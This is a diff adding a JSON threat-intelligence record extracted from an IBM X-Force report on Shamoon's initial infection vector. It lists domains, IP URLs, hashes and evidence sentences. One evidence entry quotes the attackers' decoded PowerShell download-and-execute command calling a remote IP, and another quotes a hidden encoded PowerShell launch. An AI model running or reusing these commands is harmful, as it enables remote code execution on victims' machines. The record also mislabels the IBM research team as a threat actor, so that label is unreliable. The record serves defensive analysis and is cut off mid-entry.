@@ -1,0 +1,1167 @@
+{
+  "report_id": "IBM_Full-Shamoon(02-15-2017)",
+  "title": "The Full Shamoon: How the Devastating Malware Was Inserted Into Networks",
+  "source": null,
+  "published_date": null,
+  "report_metadata": {
+    "file_name": "IBM_Full-Shamoon(02-15-2017).pdf",
+    "file_path": "/root/APTtext/IBM_Full-Shamoon(02-15-2017).pdf",
+    "source_type": "pdf",
+    "char_length": 10068,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_Intelligence_Services",
+      "type": "ThreatActor",
+      "name": "Intelligence Services",
+      "normalized_name": "Intelligence Services",
+      "aliases": [
+        "IRIS"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_1",
+        "ev_21"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_1",
+      "supporting_evidence_ids": [
+        "ev_21"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Shamoon",
+      "type": "Malware",
+      "name": "Shamoon",
+      "normalized_name": "Shamoon",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_1",
+        "ev_17",
+        "ev_26",
+        "ev_4"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "family": "Shamoon",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_17",
+      "supporting_evidence_ids": [
+        "ev_26",
+        "ev_1",
+        "ev_4"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_The_Full_Shamoon",
+      "type": "Campaign",
+      "name": "The Full Shamoon",
+      "normalized_name": "The Full Shamoon",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_domain_ntg-sa.com",
+      "type": "Domain",
+      "name": "ntg-sa.com",
+      "normalized_name": "ntg-sa.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_19",
+        "ev_21",
+        "ev_38"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "ntg-sa.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_19",
+      "supporting_evidence_ids": [
+        "ev_38",
+        "ev_21"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_IRIS",
+      "type": "ThreatActor",
+      "name": "IRIS",
+      "normalized_name": "IRIS",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_1",
+        "ev_21"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_Intelligence_Services"
+    },
+    {
+      "id": "ent_domain_com-ho.me",
+      "type": "Domain",
+      "name": "com-ho.me",
+      "normalized_name": "com-ho.me",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_11",
+        "ev_12"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "com-ho.me",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_11",
+      "supporting_evidence_ids": [
+        "ev_12"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_mol.com-ho.me",
+      "type": "Domain",
+      "name": "mol.com-ho.me",
+      "normalized_name": "mol.com-ho.me",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_11"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "mol.com-ho.me",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_11",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_ntg.sa.com",
+      "type": "Domain",
+      "name": "ntg.sa.com",
+      "normalized_name": "ntg.sa.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_19"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "ntg.sa.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_19",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_139.59.46.154_3485_eiloShaegae1",
+      "type": "URL",
+      "name": "http://139.59.46.154:3485/eiloShaegae1",
+      "normalized_name": "http://139.59.46.154:3485/eiloShaegae1",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_33",
+        "ev_39"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "http://139.59.46.154:3485/eiloShaegae1’)”",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_33",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_139.59.46.154_3485_eiloShaegae1.",
+      "type": "URL",
+      "name": "http://139.59.46.154:3485/eiloShaegae1.",
+      "normalized_name": "http://139.59.46.154:3485/eiloShaegae1.",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_33",
+        "ev_39"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "http://139.59.46.154:3485/eiloShaegae1.",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_33",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_45.76.128.165_4443_0w0O6.",
+      "type": "URL",
+      "name": "http://45.76.128.165:4443/0w0O6.",
+      "normalized_name": "http://45.76.128.165:4443/0w0O6.",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_40"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "http://45.76.128.165:4443/0w0O6.",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_40",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_briefl.ink_qhtma",
+      "type": "URL",
+      "name": "http://briefl.ink/qhtma",
+      "normalized_name": "http://briefl.ink/qhtma",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_35"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "http://briefl.ink/qhtma",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_35",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ioc_sha256_528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62",
+      "type": "SHA256",
+      "name": "528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62",
+      "normalized_name": "528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_31"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_31",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6",
+      "type": "SHA256",
+      "name": "e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6",
+      "normalized_name": "e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_37"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_37",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_43fad2d62bc23ffdc6d301571135222c",
+      "type": "MD5",
+      "name": "43fad2d62bc23ffdc6d301571135222c",
+      "normalized_name": "43fad2d62bc23ffdc6d301571135222c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_36"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "43fad2d62bc23ffdc6d301571135222c",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_36",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_45b0e5a457222455384713905f886bd4",
+      "type": "MD5",
+      "name": "45b0e5a457222455384713905f886bd4",
+      "normalized_name": "45b0e5a457222455384713905f886bd4",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_30"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "value": "45b0e5a457222455384713905f886bd4",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_30",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_cv_itworx.doc",
+      "type": "File",
+      "name": "cv_itworx.doc",
+      "normalized_name": "cv_itworx.doc",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_10"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "file_name": "cv_itworx.doc",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_10",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_job_titles_itworx.doc",
+      "type": "File",
+      "name": "job_titles_itworx.doc",
+      "normalized_name": "job_titles_itworx.doc",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_16"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "file_name": "job_titles_itworx.doc",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_ntertmgr32.exe",
+      "type": "File",
+      "name": "ntertmgr32.exe",
+      "normalized_name": "ntertmgr32.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_26",
+        "ev_41"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "file_name": "ntertmgr32.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_41",
+      "supporting_evidence_ids": [
+        "ev_26"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_ntertmgr64.exe",
+      "type": "File",
+      "name": "ntertmgr64.exe",
+      "normalized_name": "ntertmgr64.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_26",
+        "ev_41"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "file_name": "ntertmgr64.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_41",
+      "supporting_evidence_ids": [
+        "ev_26"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_vdsk911.sys",
+      "type": "File",
+      "name": "vdsk911.sys",
+      "normalized_name": "vdsk911.sys",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_26",
+        "ev_41"
+      ],
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "file_name": "vdsk911.sys",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_41",
+      "supporting_evidence_ids": [
+        "ev_26"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_IRIS",
+      "tail_id": "ent_threatactor_Intelligence_Services",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_1",
+        "ev_21"
+      ],
+      "primary_evidence_id": "ev_1",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "type": "uses_malware",
+      "head_id": "ent_campaign_The_Full_Shamoon",
+      "tail_id": "ent_malware_Shamoon",
+      "head_type": "Campaign",
+      "tail_type": "Malware",
+      "confidence": 0.86,
+      "evidence_ids": [
+        "ev_title"
+      ],
+      "primary_evidence_id": "ev_title",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "uses_malware",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "title_actor_tail",
+        "schema_version": "v3.2-report-recovery",
+        "evidence_span": "ev_title"
+      },
+      "head": {
+        "id": "ent_campaign_The_Full_Shamoon",
+        "type": "Campaign",
+        "name": "The Full Shamoon",
+        "normalized_name": "The Full Shamoon",
+        "aliases": [],
+        "confidence": 0.9,
+        "evidence_ids": [],
+        "report_id": "IBM_Full-Shamoon(02-15-2017)",
+        "sources": [
+          "llm",
+          "title_derive"
+        ],
+        "primary_evidence_id": null,
+        "supporting_evidence_ids": [],
+        "needs_review": true,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      },
+      "tail": {
+        "id": "ent_malware_Shamoon",
+        "type": "Malware",
+        "name": "Shamoon",
+        "normalized_name": "Shamoon",
+        "aliases": [],
+        "confidence": 0.93,
+        "evidence_ids": [
+          "ev_1",
+          "ev_17",
+          "ev_26",
+          "ev_4"
+        ],
+        "report_id": "IBM_Full-Shamoon(02-15-2017)",
+        "family": "Shamoon",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_17",
+        "supporting_evidence_ids": [
+          "ev_26",
+          "ev_1",
+          "ev_4"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "entity_scope": "core",
+        "core_observation": true
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "type": "uses_malware",
+      "head_id": "ent_threatactor_Intelligence_Services",
+      "tail_id": "ent_malware_Shamoon",
+      "head_type": "ThreatActor",
+      "tail_type": "Malware",
+      "confidence": 0.89,
+      "evidence_ids": [
+        "ev_8",
+        "ev_4",
+        "ev_5",
+        "ev_7",
+        "ev_9"
+      ],
+      "primary_evidence_id": "ev_8",
+      "direction": "head_to_tail",
+      "extraction_method": "rule",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "deploy",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "execution",
+        "notes": "aliases_seen=iris",
+        "schema_version": "v2.0-evidence"
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step_id": "step_001",
+      "stage": "execution",
+      "relation_id": "rel_0002",
+      "type": "uses_malware",
+      "summary": "The Full Shamoon uses_malware Shamoon",
+      "evidence_ids": [
+        "ev_title"
+      ]
+    },
+    {
+      "step_id": "step_002",
+      "stage": "execution",
+      "relation_id": "rel_0003",
+      "type": "uses_malware",
+      "summary": "Intelligence Services uses_malware Shamoon",
+      "evidence_ids": [
+        "ev_8",
+        "ev_4",
+        "ev_5"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_1",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s1"
+      },
+      "text": "Researchers from the IBM X-Force Incident Response and Intelligence Services (IRIS) team identified a missing link in the operations of a threat actor involved in recent Shamoon malware attacks against Gulf state organizations.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "Through their recent investigations, our forensics analysts pinpointed the initial compromise vector and post-compromise operations that led to the deployment of the destructive Shamoon malware on targeted infrastructures.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_5",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s5"
+      },
+      "text": "Their findings pointed to what appears to be the initial point of compromise the attackers used: a document containing a malicious macro that, when approved to execute, enabled C2 communications to the attacker’s server and remote shell via PowerShell.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_7",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s7"
+      },
+      "text": "The attackers use their access to deploy additional tools and malware to other endpoints or escalate privileges in the network.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_8",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s8"
+      },
+      "text": "The attackers deploy the Shamoon malware.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_9",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s9"
+      },
+      "text": "A coordinated Shamoon outbreak begins and computer hard drives across the organization are permanently wiped.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_10",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s1"
+      },
+      "text": "Detail Info File name cv_itworx.doc Hosting URL Embedded PowerShell PowerShell.exe -window hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4A",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_11",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s2"
+      },
+      "text": "Our researchers examined the domain that hosted the first malicious file, mol.com-ho[.]me.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_12",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s3"
+      },
+      "text": "Per the domain’s WHOIS record, an anonymized registrant registered com-ho[.]me in October 2016 and used it to serve malicious documents with similar macro activation features .",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_16",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s7"
+      },
+      "text": "File name job_titles_itworx.doc",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_17",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s1"
+      },
+      "text": "The following figure is a visual example of what employees may have encountered when they opened the malicious Word files sent to them in preparation for a Shamoon attack:",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_19",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s3"
+      },
+      "text": "Domain Name Spoofed Site ntg-sa[.]com The domain ntg-sa[.]com appears to spoof the legit domain ntg.sa.com associated with the Namer Trading Group.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_21",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s5"
+      },
+      "text": "X-Force IRIS discovered that the threat actor was hosting at least one malicious executable on a server hosted on ntg-sa[.]com.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_26",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s10"
+      },
+      "text": "Based on observations associated with the malicious document, we observed subsequent shell sessions probably associated with Metasploit’s Meterpreter that enabled deployment of additional tools and malware preceding deployment of three Shamoon-related files: ntertmgr32.exe, ntertmgr64.exe and vdsk911.sys.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_30",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r1"
+      },
+      "text": "MD5 45b0e5a457222455384713905f886bd4",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_31",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r2"
+      },
+      "text": "SHA256 528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_33",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r4"
+      },
+      "text": "Decode PowerShell.exe -w hidden -noni -nop -c “iex(New-Object System.Net.WebClient).DownloadString(‘hxxp://139.59.46.154:3485/eiloShaegae1’)”",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_35",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r6"
+      },
+      "text": "X-Force IRIS researchers further identified that the threat actor behind the malicious documents served many of them using a URL-shortening scheme in the following pattern: briefl[.]ink/{a-z0-9}[5].",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_36",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r1"
+      },
+      "text": "MD5 43fad2d62bc23ffdc6d301571135222c",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_37",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r2"
+      },
+      "text": "SHA256 e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_38",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r3"
+      },
+      "text": "X-Force IRIS discovered that the threat actor was hosting at least one malicious executable on a server hosted on ntg-sa[.]com. This file duped targets into believing it was a Flash player installer that would drop a Windows batch to invoke PowerShell into the same C2 communications.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_39",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r4"
+      },
+      "text": "Analysis of one of the threat actor’s documents found that if the macro executes, it launches two separate PowerShell Scripts. The first one executes a PowerShell script served from hxxp://139.59.46.154:3485/eiloShaegae1. The host is possibly related to attacks that served the Pupy RAT , a publicly available cross-platform remote access tool.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_40",
+      "evidence_type": "report_text",
+      "report_id": "IBM_Full-Shamoon(02-15-2017)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r5"
+      },
+      "text": "If this execution is successful, it creates a buffer using VirtualAlloc and calls InternetReadFile in a loop until all the file contents are retrieved from hxxp://45.76.128.165:4443/0w0O6. This is then returned as a string to PowerShell, which calls invoke-expression (iex) on it, indicating that the expected payload is PowerShell.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_41",
+      "evidence_type": "report_text",
